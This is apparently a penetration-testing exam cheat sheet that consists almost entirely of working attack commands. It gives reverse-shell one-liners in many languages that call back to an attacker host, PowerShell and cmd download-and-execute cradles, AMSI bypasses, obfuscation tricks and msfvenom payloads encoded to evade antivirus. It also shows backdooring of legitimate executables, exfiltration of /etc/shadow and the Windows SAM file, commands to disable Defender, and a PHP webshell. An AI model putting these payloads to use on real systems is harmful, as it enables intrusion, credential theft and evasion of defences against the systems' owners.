## 🗺️ EVASION FLOW

```
Generate Payload → Encode/Obfuscate → Serve → Cradle → Execute → Catch Shell
```

---

## 1️⃣ REVERSE SHELLS — All Flavors ⭐⭐⭐

### Listener (Kali — always first)

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444                        # better shell (arrow keys work)
nc -lvnp 443                                # use 443/80 to blend with traffic

# MSF handler
use exploit/multi/handler
set PAYLOAD [MATCH_MSFVENOM_PAYLOAD]
set LHOST [KALI_IP]
set LPORT 4444
set ExitOnSession false
exploit -j
```

### Bash

```bash
bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1
bash -c 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1'
exec bash -i &>/dev/tcp/[KALI_IP]/4444 <&1
0<&196;exec 196<>/dev/tcp/[KALI_IP]/4444; sh <&196 >&196 2>&196
```

### Netcat

```bash
nc -e /bin/sh [KALI_IP] 4444
nc -e /bin/bash [KALI_IP] 4444
nc [KALI_IP] 4444 | /bin/bash | nc [KALI_IP] 4445       # two-listener method
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [KALI_IP] 4444 >/tmp/f
```

### Python

```bash
# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[KALI_IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[KALI_IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Short form
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("[KALI_IP]",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

### PHP

```bash
php -r '$sock=fsockopen("[KALI_IP]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[KALI_IP]",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
# Web context (URL encoded for delivery):
php -r '$s=fsockopen("[KALI_IP]",4444);`/bin/bash -i <&3 >&3 2>&3`;'
```

### Perl

```bash
perl -e 'use Socket;$i="[KALI_IP]";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

### Ruby

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[KALI_IP]","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'c=TCPSocket.new("[KALI_IP]","4444");$stdin=$stdout=$stderr=c;exec("/bin/sh -i")'
```

### PowerShell (Windows) ⭐⭐

```powershell
# Standard reverse shell
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('[KALI_IP]',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Short one-liner (less reliable but fast)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/Invoke-PowerShellTcp.ps1')"
```

### Windows cmd (no PS)

```cmd
nc.exe -e cmd.exe [KALI_IP] 4444
```

### Shell Stabilization (After nc Shell) ⭐

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 38 cols 116

# Alternative
script /dev/null -c bash
```

---

## 2️⃣ POWERSHELL — Execution & Evasion ⭐⭐⭐

### Execution Policy Bypass

```powershell
# Run without changing policy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
powershell -ep bypass -c "[COMMAND]"

# Per-process bypass (no admin needed)
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Bypass -Scope Process -Force

# Other bypass methods
powershell -exec bypass
powershell -nop -ep bypass -c "IEX(...)"
Get-Content script.ps1 | powershell -noprofile -
```

### Download Cradles ⭐⭐⭐

```powershell
# WebClient DownloadString (execute in memory — no disk write)
IEX(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/script.ps1')
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/script.ps1')"

# WebClient DownloadFile (write to disk)
(New-Object Net.WebClient).DownloadFile('http://[KALI_IP]/shell.exe','C:\Temp\shell.exe')
powershell -c "(New-Object Net.WebClient).DownloadFile('http://[KALI_IP]/shell.exe','C:\Temp\shell.exe')"

# Invoke-WebRequest
Invoke-WebRequest -Uri http://[KALI_IP]/shell.exe -OutFile C:\Temp\shell.exe
iwr -uri http://[KALI_IP]/shell.ps1 -outfile C:\Temp\shell.ps1

# Webclient with proxy bypass
$wc=New-Object System.Net.WebClient;$wc.Proxy=[System.Net.WebProxy]::GetDefaultProxy();$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IEX $wc.DownloadString('http://[KALI_IP]/script.ps1')

# curl alias (PS 5+)
curl http://[KALI_IP]/shell.exe -o C:\Temp\shell.exe

# BitsTransfer
Import-Module BitsTransfer
Start-BitsTransfer -Source http://[KALI_IP]/shell.exe -Destination C:\Temp\shell.exe
```

### -EncodedCommand ⭐⭐

```bash
# Kali — encode any PS command to base64
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://[KALI_IP]/script.ps1")' | iconv -t UTF-16LE | base64 -w 0

# Output → use in:
powershell -EncodedCommand [BASE64_OUTPUT]
powershell -enc [BASE64_OUTPUT]
powershell -nop -w hidden -enc [BASE64_OUTPUT]

# Common encoded payloads — generate on Kali:
$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://[KALI_IP]/rev.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bytes)
Write-Output $enc
```

### AMSI Bypass ⭐⭐

```powershell
# Method 1 — amsiInitFailed (classic)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2 — amsiContext null (PS 5+)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiContext','NonPublic,Static');$c=$b.GetValue($null);$d=[IntPtr].Method.GetMember('op_Explicit',[System.Reflection.BindingFlags]'Public,Static');[Runtime.InteropServices.Marshal]::WriteInt32($c,[IntPtr]::Size*2,0)

# Method 3 — string split (bypass signature detection)
$a = 'System.Management.Automation.A';$b = 'msiUtils';$c = [Ref].Assembly.GetType($a+$b);$d = $c.GetField('amsiInitFailed','NonPublic,Static');$d.SetValue($null,$true)

# Method 4 — force error (quick dirty)
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null,$null);

# Run AMSI bypass FIRST, then load tools:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/PowerUp.ps1')
```

---

## 3️⃣ CMD CRADLES — Windows File Download ⭐⭐

### certutil ⭐⭐⭐ (always available)

```cmd
certutil -urlcache -split -f http://[KALI_IP]/shell.exe C:\Temp\shell.exe
certutil -urlcache -f http://[KALI_IP]/shell.exe shell.exe
certutil -urlcache -split -f http://[KALI_IP]/shell.exe shell.exe && shell.exe

# Decode base64 file
certutil -decode encoded.b64 output.exe
certutil -encode input.exe output.b64
```

### bitsadmin

```cmd
bitsadmin /transfer myJob /download /priority high http://[KALI_IP]/shell.exe C:\Temp\shell.exe
bitsadmin /transfer n http://[KALI_IP]/shell.exe C:\Temp\shell.exe
```

### regsvr32 (AppLocker bypass — no write needed) ⭐

```cmd
# Kali — create SCT file (scriptlet)
# Save as shell.sct:
# <?XML version="1.0"?>
# <scriptlet><registration progid="x" classid="{10001111-0000-0000-0000-0000FEEDACDC}">
# <script language="JScript"><![CDATA[
# var r = new ActiveXObject("WScript.Shell").Run("cmd /c C:\\Temp\\shell.exe");
# ]]></script></registration></scriptlet>

# Target — execute (no disk write for DLL):
regsvr32 /s /n /u /i:http://[KALI_IP]/shell.sct scrobj.dll
```

### mshta (HTA execution)

```cmd
mshta http://[KALI_IP]/shell.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""C:\Temp\shell.exe"",0:close")
```

### wscript / cscript (VBS)

```cmd
wscript C:\Temp\download.vbs
cscript C:\Temp\download.vbs
```

### VBS Download Script (create on Kali, upload)

```vbscript
Set o=CreateObject("MSXML2.XMLHTTP"):o.Open "GET","http://[KALI_IP]/shell.exe",0
o.Send:Set a=CreateObject("ADODB.Stream"):a.Open:a.Type=1
a.Write o.ResponseBody:a.SaveToFile "C:\Temp\shell.exe":a.Close
CreateObject("WScript.Shell").Run "C:\Temp\shell.exe"
```

---

## 4️⃣ MSFVENOM — Payload Generation & Encoding ⭐⭐⭐

### Core Payload Generation

```bash
# Windows staged (needs handler)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f exe -o shell64.exe

# Windows stageless (self-contained — better for AV evasion)
msfvenom -p windows/meterpreter_reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f exe -o stageless.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f exe -o stageless64.exe

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f elf -o stageless.elf

# Web
msfvenom -p php/meterpreter_reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f raw -o shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f asp -o shell.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f war -o shell.war
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f hta-psh -o shell.hta
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f psh -o shell.ps1
```

### Encoding — AV Evasion ⭐⭐

```bash
# shikata_ga_nai (polymorphic x86 encoder)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# Bad character removal + encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -e x86/shikata_ga_nai -i 7 -b "\x00\x0a\x0d" -f exe -o encoded_clean.exe

# x64 encoder
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded64.exe

# Multiple encoders chained
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -e x86/shikata_ga_nai -i 5 -e x86/countdown -i 3 -f exe -o double_encoded.exe

# List all encoders
msfvenom --list encoders
msfvenom --list encoders | grep excellent
msfvenom --list encoders | grep good
```

### Staged vs Stageless — Quick Reference

```bash
# Staged  → windows/meterpreter/reverse_tcp   (slash between)
#           small payload, downloads rest from handler
#           needs reliable connection back to MSF handler

# Stageless → windows/meterpreter_reverse_tcp  (underscore)
#             larger, self-contained, no handler callback for stage
#             better for unstable connections, WAF bypass

# Rule: Use stageless when staged fails or connection is flaky
```

### Inject Payload into Legit Binary

```bash
# Backdoor legitimate executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -e x86/shikata_ga_nai -i 5 -x /usr/share/windows-binaries/plink.exe -f exe -o backdoored_plink.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -x putty.exe -k -f exe -o backdoored_putty.exe
# -k = keep original functionality
```

---

## 5️⃣ BASE64 ENCODING — Cross-Platform ⭐⭐

### Linux (Kali)

```bash
# Encode file
base64 -w 0 shell.exe > shell.b64
cat shell.b64 | base64 -d > shell.exe        # decode

# Encode string
echo -n "bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1" | base64
echo [BASE64] | base64 -d | bash             # decode + execute

# Encode for PowerShell -EncodedCommand (UTF-16LE)
echo -n 'whoami' | iconv -t UTF-16LE | base64 -w 0
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://[KALI_IP]/rev.ps1")' | iconv -t UTF-16LE | base64 -w 0
```

### Windows PowerShell

```powershell
# Encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('whoami'))

# Decode
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('[BASE64]'))
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('[BASE64]'))

# Decode + Execute
IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('[BASE64]')))

# Decode file
[System.Convert]::FromBase64String([IO.File]::ReadAllText('shell.b64')) | Set-Content -Path 'shell.exe' -Encoding Byte
```

### CMD (certutil)

```cmd
certutil -encode shell.exe shell.b64
certutil -decode shell.b64 shell.exe
```

---

## 6️⃣ OBFUSCATION TECHNIQUES ⭐

### PowerShell Variable Substitution

```powershell
# Original (detected):
IEX(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/shell.ps1')

# Obfuscated — variable split:
$a='IEX';$b='(New-Object Net.Web';$c='Client).Download';$d='String("http://[KALI_IP]/shell.ps1")';IEX($a+$b+$c+$d)

# Obfuscated — tick marks (PS ignores backtick in strings):
i`ex(ne`w-obje`ct ne`t.web`client).dow`nloadst`ring('http://[KALI_IP]/shell.ps1')

# Obfuscated — concatenation:
&('Inv'+'oke-Expres'+'sion')((&('New-Ob'+'ject') 'Net.Web'+'Client').('Down'+'loadString').Invoke('http://[KALI_IP]/shell.ps1'))

# Case variation (PS is case-insensitive):
iEx(nEw-oBjEcT nEt.wEbClIeNt).dOwNlOaDsTrInG('http://[KALI_IP]/shell.ps1')

# Aliases:
sal x IEX; x(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/shell.ps1')
```

### Invoke-Obfuscation (Full Tool)

```powershell
# On Kali (or Windows with PS):
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation

# Inside Invoke-Obfuscation:
SET SCRIPTBLOCK IEX(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/rev.ps1')
TOKEN
ALL
1

# Or encode approach:
SET SCRIPTBLOCK [PAYLOAD]
ENCODING
1                                    # base64 encode
# Copy output → use with powershell -enc [OUTPUT]
```

### CMD Obfuscation

```cmd
# Environment variable substitution
set a=net&& set b= user&& %a%%b%

# String reversal trick (FOR /F)
cmd /V:on /c "set x=exe.llehS/pmet/C&&call set y=!x:~-3!!x:~0,-4!&&!y!"

# Carets (^ ignored in cmd)
n^e^t u^s^e^r
p^o^w^e^r^s^h^e^l^l -ep bypass
```

---

## 7️⃣ BASH — FILE TRANSFER ONE-LINERS ⭐⭐

### Kali → Linux Target

```bash
# HTTP server (Kali)
python3 -m http.server 80
python3 -m http.server 8080

# Target download
wget http://[KALI_IP]/file -O /tmp/file
curl http://[KALI_IP]/file -o /tmp/file
curl http://[KALI_IP]/file > /tmp/file

# Execute directly in memory
curl http://[KALI_IP]/script.sh | bash
wget -qO- http://[KALI_IP]/script.sh | sh

# Make executable + run
wget http://[KALI_IP]/shell.elf -O /tmp/s && chmod +x /tmp/s && /tmp/s
```

### Linux → Kali (Exfil)

```bash
# nc send
nc [KALI_IP] 4444 < /etc/passwd
nc [KALI_IP] 4444 < /etc/shadow
tar czf - /home/[USER] | nc [KALI_IP] 4444

# Kali receive
nc -lvnp 4444 > received.txt
nc -lvnp 4444 > loot.tar.gz && tar xzf loot.tar.gz

# curl POST (Kali needs listener — use php/nc)
curl -X POST http://[KALI_IP]:8888/ -d @/etc/passwd
```

### No Tools Available — Pure Bash

```bash
# Read file over TCP (no nc/curl/wget)
exec 3<>/dev/tcp/[KALI_IP]/4444
echo -e "GET /shell.sh HTTP/1.0\r\nHost: [KALI_IP]\r\n\r\n" >&3
cat <&3 > /tmp/shell.sh
chmod +x /tmp/shell.sh && /tmp/shell.sh
```

---

## 8️⃣ WINDOWS FILE TRANSFER — Complete Reference ⭐⭐

### HTTP Download

```cmd
certutil -urlcache -split -f http://[KALI_IP]/shell.exe C:\Temp\shell.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://[KALI_IP]/shell.exe','C:\Temp\shell.exe')"
powershell -c "Invoke-WebRequest -Uri http://[KALI_IP]/shell.exe -OutFile C:\Temp\shell.exe"
bitsadmin /transfer job /download /priority high http://[KALI_IP]/shell.exe C:\Temp\shell.exe
```

### SMB Download

```bash
# Kali — SMB server
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -username [USER] -password [PASS]

# Target cmd
copy \\[KALI_IP]\share\shell.exe C:\Temp\shell.exe
xcopy \\[KALI_IP]\share\shell.exe C:\Temp\
net use \\[KALI_IP]\share /user:[USER] [PASS]
```

### TFTP (UDP — bypasses some filters)

```bash
# Kali
atftpd --daemon --port 69 $(pwd)
# or
python3 -m tftpy.TftpServer /tmp

# Target cmd
tftp -i [KALI_IP] GET shell.exe
```

### Exfil from Windows

```cmd
# nc (if available on target)
nc.exe [KALI_IP] 4444 < C:\Windows\System32\config\SAM

# PowerShell upload to Kali
powershell -c "(New-Object Net.WebClient).UploadFile('http://[KALI_IP]:8888/upload','C:\path\to\file')"

# SMB copy back to Kali
copy C:\Windows\System32\config\SAM \\[KALI_IP]\share\
```

---

## 9️⃣ ANTIVIRUS EVASION — Practical Tips ⭐

```bash
# 1. Use stageless payloads over staged
msfvenom -p windows/meterpreter_reverse_tcp ...        # underscore = stageless

# 2. Encode multiple times
msfvenom ... -e x86/shikata_ga_nai -i 10 ...

# 3. Change default LPORT (4444 is flagged)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=443 -f exe -o shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=8443 -f exe -o shell.exe

# 4. Use HTTPS payload
msfvenom -p windows/meterpreter/reverse_https LHOST=[KALI_IP] LPORT=443 -f exe -o shell.exe
# Handler:
set PAYLOAD windows/meterpreter/reverse_https
set LPORT 443

# 5. Inject into legit binary
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=443 -x /usr/share/windows-binaries/whoami.exe -f exe -o legit_looking.exe

# 6. Use different format (may bypass file-based AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f dll -o payload.dll
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f psh-cmd -o payload.cmd

# 7. Check detection rate (Kali)
wine /opt/msfvenom-check/check.exe payload.exe         # offline
# Or upload to antiscan.me (no distribution to AV vendors)

# 8. Disable Defender (if admin)
powershell -c "Set-MpPreference -DisableRealtimeMonitoring \$true"
powershell -c "Add-MpPreference -ExclusionPath 'C:\Temp'"
```

---

## 🔟 QUICK PAYLOAD COOK-BOOK ⭐⭐⭐

```bash
# ── Got web RCE (Linux) ──
# Payload to deliver via curl/browser:
bash -c 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1'
# URL encoded:
bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/[KALI_IP]/4444%200>%261'

# ── Got web RCE (PHP) ──
# Upload: <?php system($_GET["cmd"]); ?>
# Execute: curl "http://[TARGET_IP]/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1'"

# ── Got Windows cmd shell (no PS) ──
certutil -urlcache -f http://[KALI_IP]/shell.exe C:\Temp\s.exe && C:\Temp\s.exe

# ── Got Windows cmd shell (PS available) ──
powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/shell.ps1')"

# ── Need to bypass AppLocker ──
regsvr32 /s /n /u /i:http://[KALI_IP]/shell.sct scrobj.dll
mshta http://[KALI_IP]/shell.hta

# ── AV killing staged payload ──
msfvenom -p windows/meterpreter_reverse_tcp LHOST=[KALI_IP] LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o stageless_443.exe

# ── Need PS rev shell, no upload ──
powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('[KALI_IP]',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"
```

---

## ⚡ QUICK REFERENCE — Scenario → Shell Method

|Scenario|Shell Method|
|---|---|
|Linux RCE / cmd injection|`bash -c 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1'`|
|PHP webshell|`<?php system($_GET["cmd"]); ?>` → curl RCE|
|Python available|`python3 -c 'import socket...'`|
|nc with -e flag|`nc -e /bin/bash [KALI_IP] 4444`|
|nc no -e flag|mkfifo one-liner|
|Windows cmd only|`certutil` download → execute|
|Windows PS available|`-ep bypass -c IEX(Net.WebClient)...`|
|AV blocking exe|stageless + shikata × 10 + port 443|
|AppLocker active|`regsvr32 /i:http://... scrobj.dll`|
|No tools on Linux|`/dev/tcp` bash redirect|

---

## 🧠 EXAM DECISION TREE

```
Need to get a shell?
│
├── Linux target with RCE?
│   ├── bash -i >& /dev/tcp/[KALI_IP]/4444 directly
│   ├── Python/Perl/PHP available? → matching one-liner
│   └── nc available? → nc -e /bin/bash or mkfifo
│
├── Windows target with RCE?
│   ├── PowerShell available? → IEX DownloadString rev shell
│   ├── CMD only? → certutil download exe → execute
│   └── AppLocker? → regsvr32 scrobj.dll or mshta
│
├── Payload being caught by AV?
│   ├── Switch staged → stageless (underscore payload)
│   ├── Add shikata_ga_nai -i 10
│   ├── Change LPORT to 443/80/8443
│   └── Use HTTPS payload (reverse_https)
│
├── Need to encode a command?
│   ├── echo -n '[CMD]' | iconv -t UTF-16LE | base64 -w 0
│   └── powershell -enc [OUTPUT]
│
└── AMSI blocking PS scripts?
    ├── Run AMSI bypass one-liner first
    └── Then IEX download cradle
```

---
---
